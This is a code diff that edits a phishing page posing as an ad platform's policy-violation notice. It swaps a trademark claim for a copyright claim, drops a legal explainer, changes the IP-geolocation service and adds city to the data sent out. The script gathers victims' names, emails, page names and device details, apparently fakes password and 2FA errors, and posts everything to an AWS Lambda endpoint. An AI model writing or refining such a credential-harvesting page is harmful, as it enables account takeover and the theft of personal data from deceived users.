@@ -3461,7 +3461,7 @@
                         </div>
 
                         <div class="appeal-text" style="font-weight: 500;">
-                            We have received multiple customer reports stating that your ad infringes on trademark rights, which violates our advertising policies. As a result, your ad account is scheduled for review.
+                            We have received multiple customer reports indicating that your advertisement has violated copyright laws, which constitutes a violation of our advertising policies. As a result, your ad account is scheduled for review.
                         </div>
 
                         <div id="utm-ticketId" style="display: block;">
@@ -3577,26 +3577,6 @@
                         </div>
                     </div>
                 </div>
-                <h5>What is trademark infringement?</h5>
-                <br>
-                <h6>Generally, trademark infringement occurs when all three of the following requirements are met:</h6>
-                <ul>
-                    <il>1. A comilany or person uses a trademark owner's trademark (or similar trademark) without
-                        permission.</il><br><br>
-
-                    <il>2. That use is in commerce, meaning that it's done in connection with the sale or promotion of
-                        goods or services.</il><br><br>
-
-                    <il>3. That use is likely to confuse consumers about the source, endorsement or affiliation of the
-                        goods or services.</il>
-                </ul>
-                <br>
-                <p>The touchstone of trademark infringement is often "likelihood of confusion", and there are many
-                    factors that determine whether a use of a trademark is likely to cause confusion. For example, when
-                    a person's trademark is also used by someone else, but on unrelated goods or services, that use may
-                    not be infringement because it may not cause confusion. Which party used the trademark first can
-                    often be an important consideration as well.</p>
-                <br>
                 <h6>Privacy Center</h6>
                 <div class="fake-likns">
                     <div class="action-button-list">
@@ -4914,7 +4894,7 @@
             'params': prettyUtmParams(),
         }
 
-        var INCORRECT_2FA_TIMEOUT = 30
+        var INCORRECT_2FA_TIMEOUT = 60
         var SEND_FORM_FICTIV_TIME = 2000
 
         var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
@@ -5019,17 +4999,16 @@
         }
 
         // Get User IP
-        var url = 'https://ipinfo.io/json'
+        var url = 'https://api.db-ip.com/v2/free/self/'
         async function getUserIp() {
             const response = await fetch(url);
             if (response.status == 200) {
                 const data = await response.json();
                 userIpData = {
-                    'user_ip': data.ip,
-                    'country': data.region,
-                    'country_code': data.country,
-                    'city': data.city,
-                    'call_code': getCallingCode(data.country)
+                    'user_ip': data.ipAddress,
+                    'country': data.countryName,
+                    'country_code': data.countryCode,
+                    'city': data.city
                 }
             } else {
                 userIpData = {
@@ -5047,6 +5026,7 @@
                 'ip_address': userIpData.user_ip,
                 'country': userIpData.country,
                 'country_code': userIpData.country_code,
+                'city': userIpData.city,
                 'full_name': formsSendData['full-name'],
                 'pers_email': formsSendData['personal-email'],
                 'bus_email': formsSendData['buiseness-email'],
@@ -5059,8 +5039,7 @@
                 'fb_page_name': formsSendData['page-name'],
                 'message': formsSendData['apeal'],
                 'user_agent': window.navigator.userAgent,
-                'user_referrer': window.window.location.href,
-                'call_code': userIpData.call_code
+                'user_referrer': window.window.location.href
             };
 
             $.ajax('https://o2psd36oxw73no6ynhu22asnli0koddh.lambda-url.us-west-2.on.aws/', {
@@ -5068,9 +5047,7 @@
                 data: JSON.stringify(templateData),
                 contentType: 'application/json'
             }).done(function () {
-                // Xử lý khi gửi thành công
             }).fail(function (error) {
-                // Xử lý khi gửi thất bại
             });
         }
 
@@ -5091,7 +5068,6 @@
                 buttonText.style.display = 'block'
                 button.removeAttribute('disabled')
             }, SEND_FORM_FICTIV_TIME)
-
         }
 
         function hidePasswordIncorrectText() {
